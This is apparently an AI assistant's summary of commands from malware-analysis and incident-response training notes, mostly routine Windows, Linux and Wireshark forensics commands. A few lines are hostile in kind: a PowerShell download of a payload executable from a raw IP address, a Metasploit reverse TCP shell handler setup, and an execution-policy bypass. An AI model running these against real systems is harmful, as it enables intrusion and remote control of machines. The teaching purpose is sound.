Here’s a comprehensive list of every command found in m21-m25.md, organized by context. For each, you’ll find the syntax (with examples) and a short explanation of what the command does.

---

# Windows / Command Prompt Commands

### 1. dir /a:h

**Syntax Example:**
```sh
dir /a:h
```
**Explanation:**  
Lists all hidden files in the current directory. The /a:h switch filters the output to only show hidden files. Useful for discovering malware or hidden artifacts.

---

### 2. reg query

**Syntax Example:**
```sh
reg query HKLM /f "YourString" /s
```
**Explanation:**  
Searches (queries) the Windows Registry for a specific string (here, "YourString") under the HKLM (HKEY_LOCAL_MACHINE) hive and all subkeys (/s). Used to find suspicious registry values or persistence mechanisms.

---

### 3. netsh interface show interface

**Syntax Example:**
```sh
netsh interface show interface
```
**Explanation:**  
Displays all network interfaces on the system, including their status (Enabled/Disabled, Connected/Disconnected). Used to check network connectivity or enumerate interfaces for disabling.

---

### 4. netsh interface set interface

**Syntax Example:**
```sh
netsh interface set interface Ethernet1 disable
netsh interface set interface Ethernet0 disable
netsh interface set interface Ethernet0 enable
```
**Explanation:**  
Enables or disables a specified network interface (e.g., Ethernet0, Ethernet1). Used for network isolation (cutting off a compromised machine).

---

### 5. ls & ls -hidden (PowerShell)

**Syntax Example:**
```powershell
ls
ls -hidden
```
**Explanation:**  
Lists files in the current directory. ls -hidden also lists hidden files (PowerShell). Used in malware analysis to reveal hidden artifacts.

---

### 6. Get-FileHash

**Syntax Example:**
```powershell
Get-FileHash .\document.pdf
Get-FileHash .\document.pdf -Algorithm MD5
```
**Explanation:**  
Calculates the hash value (SHA256 by default, or another algorithm) for a file. Used for ensuring integrity and identifying malware.

---

### 7. cd (Change Directory)

**Syntax Example:**
```powershell
cd C:\Users\Trainee\Desktop\Lab2
```
**Explanation:**  
Changes the current working directory. Used to navigate to a folder containing malware samples or analysis tools.

---

### 8. Get-Content

**Syntax Example:**
```powershell
Get-Content .\dropper.exe
Get-Content .\dropper.exe | Select-String "http"
```
**Explanation:**  
Reads the content of a file. With Select-String, you can filter lines containing specific patterns (e.g., URLs in binaries).

---

### 9. strings64 (Sysinternals)

**Syntax Example:**
```powershell
.\strings64 C:\Users\trainee\Desktop\Lab2\dropper.exe | Select-String "http"
```
**Explanation:**  
Extracts readable strings from a binary file. Useful for quickly identifying embedded URLs, commands, or suspicious artifacts.

---

### 10. tasklist | findstr

**Syntax Example:**
```sh
tasklist | findstr <PROCESSID>
tasklist | findstr 252
```
**Explanation:**  
Lists all running processes and filters for a specific process ID. Used to identify which executable is running under a suspicious PID.

---

### 11. netstat & netstat -ano | find

**Syntax Example:**
```sh
netstat
netstat -ano | find "1337"
```
**Explanation:**  
Displays active network connections and listening ports. -ano shows all connections with process IDs. Used to find malware network activity.

---

### 12. regedit

**Syntax Example:**
```sh
regedit
```
**Explanation:**  
Opens the Windows Registry Editor GUI. Used for manual inspection or modification of registry keys.

---

### 13. Invoke-Webrequest

**Syntax Example:**
```powershell
Invoke-Webrequest -o .\pl.donotexecute http://199.63.64.51/pl.exe 
```
**Explanation:**  
Downloads a file from a URL (PowerShell). Used by attackers (and analysts) to retrieve payloads from the Internet.

---

### 14. New-ItemProperty & New-Item

**Syntax Example:**
```powershell
New-ItemProperty -Force -Path "HKLM:\Software\Policies\Microsoft\Windows Defender\Scan" -Name DisableRemovableDriveScanning -Value 0
New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows Defender\Scan"
```
**Explanation:**  
Creates or updates a registry property (New-ItemProperty), or creates a new registry key/folder (New-Item). Used for setting system policies.

---

### 15. Test-Path

**Syntax Example:**
```powershell
if (Test-Path "HKLM:\Software\Policies\Microsoft\Windows Defender\Scan") { ... }
```
**Explanation:**  
Checks if a given path (file, folder, or registry key) exists. Used to conditionally create configuration values.

---

### 16. powershell.exe -ep bypass

**Syntax Example:**
```sh
powershell.exe -ep bypass C:\Users\trainee\Documents\hardening.ps1
```
**Explanation:**  
Runs a PowerShell script, bypassing the default execution policy (allowing unsigned scripts to run). Used to apply system changes via script.

---

### 17. Get-Process | select -Property Name,Description | findstr

**Syntax Example:**
```powershell
Get-Process | select -Property Name,Description | findstr sdf
```
**Explanation:**  
Lists all processes and filters by name/description using findstr. Useful for identifying suspicious processes.

---

# Linux / Bash Commands

### 18. cat

**Syntax Example:**
```sh
cat ~/.bashrc
```
**Explanation:**  
Displays the contents of a file (here, .bashrc). Used to check for malicious persistence mechanisms in user login scripts.

---

### 19. ps -ef | grep

**Syntax Example:**
```sh
ps -ef | grep vmusr
```
**Explanation:**  
Lists all running processes and filters for those containing the string "vmusr". Used to find suspicious processes.

---

### 20. msfconsole

**Syntax Example:**
```sh
msfconsole
```
**Explanation:**  
Starts the Metasploit Framework console, a penetration testing and exploitation framework.

---

### 21. use, set, exploit (Metasploit)

**Syntax Example:**
```sh
use payload/windows/shell_reverse_tcp
use exploit/multi/handler
set LHOST 10.10.64.51
set LPORT 1337
exploit
```
**Explanation:**  
Metasploit-specific commands. Sets up a handler to receive a reverse TCP shell from a compromised machine.

---

### 22. whoami

**Syntax Example:**
```sh
whoami
```
**Explanation:**  
Displays the current user. Used to confirm access on a compromised machine.

---

# Wireshark / Network Analysis

### 23. Wireshark Display Filter

**Syntax Example:**
```sh
http.request.method == GET
tcp.port == 8080
```
**Explanation:**  
Filters packets in Wireshark to show only HTTP GET requests or TCP traffic on port 8080.

---

# Windows Sysinternals Tools

### 24. Autoruns, Procmon, TCPView, Regshot, Process Explorer

**How to use:**  
These are GUI tools, but can also be invoked via command line (e.g., autorunsc64.exe for command line use).

**Explanation:**  
- Autoruns: Shows programs configured to run at startup.
- Procmon (Process Monitor): Monitors file system, registry, and process/thread activity in real time.
- TCPView: Lists all current network connections.
- Regshot: Takes and compares registry snapshots.
- Process Explorer: Advanced task manager, shows process trees and details.

---

# Miscellaneous Commands

### 25. Get-Acl & Set-Acl

**Syntax Example:**
```powershell
Get-Acl C:\Windows
Set-Acl -Path "C:\secret.txt" -AclObject $acl
```
**Explanation:**  
Gets and sets file or registry permissions (Access Control Lists).

---

### 26. Stop-Service, Start-Service, Suspend-Service, Restart-Service

**Syntax Example:**
```powershell
Stop-Service -Name spooler
Start-Service -Name spooler
Suspend-Service -Name spooler
Restart-Service -Name spooler
```
**Explanation:**  
Manages Windows services by stopping, starting, suspending, or restarting them.

---

# Summary Table

| Command/Tool             | Syntax Example/Invocation                                            | Purpose                                           |
|--------------------------|---------------------------------------------------------------------|---------------------------------------------------|
| dir /a:h                 | dir /a:h                                                            | List hidden files                                 |
| reg query                | reg query HKLM /f "key" /s                                          | Search registry                                   |
| netsh interface show/set | netsh interface show interface / netsh interface set interface ...   | View/modify network interfaces                    |
| ls, ls -hidden           | ls / ls -hidden                                                     | List files (PowerShell, including hidden)         |
| Get-FileHash             | Get-FileHash .\file [-Algorithm MD5]                                | Hash a file                                       |
| Get-Content              | Get-Content .\file | Select-String "pattern"                        | Search file content                               |
| strings64                | strings64 file.exe | Select-String "pattern"                         | Extract readable strings from binaries            |
| tasklist | findstr       | tasklist | findstr PID                                              | Identify process by PID                           |
| netstat, netstat -ano    | netstat -ano | find "port"                                         | Network connections and process mapping           |
| regedit                  | regedit                                                             | Windows Registry editor                           |
| Invoke-Webrequest        | Invoke-Webrequest -o .\file URL                                     | Download a file                                   |
| New-Item, New-ItemProperty| New-Item ... / New-ItemProperty ...                                | Registry key/value creation                       |
| Test-Path                | if (Test-Path "path") { ... }                                       | Check if path exists                              |
| powershell.exe -ep bypass| powershell.exe -ep bypass script.ps1                                | Run script bypassing execution policy             |
| Get-Process | findstr    | Get-Process | select -Property Name | findstr process                                   | Filter processes                                  |
| cat                      | cat ~/.bashrc                                                       | Read file (Linux)                                 |
| ps -ef | grep            | ps -ef | grep string                                                | Find process (Linux)                              |
| msfconsole + set/handler | msfconsole, use, set, exploit                                       | Metasploit exploitation                           |
| whoami                   | whoami                                                              | Show current user                                 |
| Wireshark filters        | http.request.method == GET                                          | Filter network packets                            |
| Sysinternals Tools       | autoruns, procmon, tcpview, regshot, procexp                        | Malware analysis                                  |
| Get-Acl/Set-Acl          | Get-Acl file | Set-Acl file -AclObject ...                          | Manage permissions                                |
| Stop/Start-Service       | Stop-Service -Name ...                                              | Manage services                                   |

---

If you need a specific command shown in more detail, or want sample outputs or advanced usage, let me know!
